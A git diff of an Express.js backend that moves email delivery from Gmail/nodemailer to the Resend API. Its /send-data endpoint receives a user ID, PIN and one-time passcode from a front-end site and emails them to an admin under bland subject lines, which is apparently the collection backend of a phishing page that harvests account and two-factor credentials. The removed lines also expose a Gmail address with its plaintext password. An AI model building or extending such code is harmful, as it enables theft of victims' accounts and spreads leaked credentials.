@@ -1,36 +1,31 @@
+require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
-const nodemailer = require('nodemailer');
-const app = express();
+const { Resend } = require('resend'); // New Resend import
 
-app.use(cors()); // Allows your Netlify site to talk to this backend
+const app = express();
+const resend = new Resend(process.env.RESEND_API_KEY); // Using your API Key
+
+app.use(cors());
 app.use(express.json());
 
-// Setup your Email "Transporter"
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'mosesbenjamin1985@gmail.com',
-        pass: '130078al' // Not your login password, a Google App Password
-    }
-});
-
-app.post('/send-data', (req, res) => {
+app.post('/send-data', async (req, res) => {
     const { userId, pin, otp } = req.body;
 
-    const mailOptions = {
-        from: process.env.SMTP_USER,
-        to: process.env.ADMIN_EMAIL,
-        subject: 'New Notification',
-        text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
-    };
+    try {
+        const data = await resend.emails.send({
+            from: 'Acme <onboarding@resend.dev>', // You can change this later if you verify a domain
+            to: process.env.ADMIN_EMAIL,
+            subject: '🚀 New Site Activity',
+            text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
+        });
 
-    transporter.sendMail(mailOptions, (error, info) => {
-        if (error) {
-            return res.status(500).send(error.toString());
-        }
-        res.status(200).send('Email sent!');
-    });
+        console.log("Email Sent:", data);
+        res.status(200).json({ message: 'Success' });
+    } catch (error) {
+        console.error("Resend Error:", error);
+        res.status(500).json({ error: error.message });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
